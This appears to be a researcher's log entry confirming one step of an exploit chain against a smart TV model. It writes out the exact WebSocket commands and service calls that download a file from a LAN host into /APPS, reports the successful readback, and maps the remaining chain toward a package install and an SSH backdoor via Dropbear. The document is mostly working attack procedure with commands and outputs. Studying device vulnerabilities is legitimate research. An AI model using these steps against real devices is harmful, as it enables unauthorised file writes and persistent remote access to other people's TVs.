# 02 — Fetcher arbitrary write confirmed

**Date:** 2026-11-24
**Method:** pushed `recon-write.html` to TV browser via `/api/open`.

## Procedure

1. Opened WebSocket to `wss://localhost:9888` and sent the fetcher start
   command:
   ```json
   {"path":"phoenix://service/basic/fetcher","method":"start",
    "parameters":{},"session":901,"timeout":10}
   ```
2. Called `vowOS.service.syncExecute("basic/fetcher", {api:"fetchFile",
   args: <json-string>})` with:
   - `url`: `http://192.168.19.201:8765/test-write.txt`
   - `directory`: `/APPS/.alvidaa-write-test`
   - `permission`: 420 (0o644)
3. Read back via `vowOS.service.syncExecute("hiutils", {api:"fileRead",
   args:{mode:6, path:".alvidaa-write-test"}})`.

## Result

| Step | ret | msg |
|---|---|---|
| startFetcher | ✅ | `"start sent, waited 1.5s"` |
| fetchFile | **true** | `"download finished"` |
| readback | **true** | `"alvidaa-write-test-2026-11-24"` (exact match) |

**Arbitrary file write as uid 314 into `/APPS` is confirmed on build Q0804.**

The fetcher downloaded a file from an HTTP URL on the LAN and wrote it to an
absolute path under `/APPS` with the requested permissions. The 100U7Q chain's
step 3 (arbitrary write) transplants directly to this model and build.

## Implications for the full chain

Three of five 100U7Q chain steps are confirmed on Q0804:

| Step | 100U7Q | 65U70QEVS Q0804 | Status |
|---|---|---|---|
| 0. MQTT pair | port 36669, sidee | already paired (launcher) | ✅ |
| 1. Phoenix WS | wss://localhost:9888 | connected | ✅ |
| 2. Fetcher start | WS start command | accepted | ✅ |
| 3. fetchFile write | uid 314 into /APPS | confirmed | ✅ |
| 4. pkgmgr install | superwatch_socket cmd 82 | **untested** | ⏳ |
| 5. Dropbear + SSH | port 8008, key-only | **untested** | ⏳ |

## Critical arch difference

The 100U7Q record states 32-bit ARM userland (`EM_ARM`). This TV's UA says
`Linux aarch64`. **The 100U7Q's ARMv7 Dropbear binary will not run here.**
An aarch64 static build is needed.

## Cleanup

The test file `/APPS/.alvidaa-write-test` (30 bytes) remains on the TV. It is
inert plaintext and can be removed via a `fileWrite` of zero bytes or
overwritten at any time.
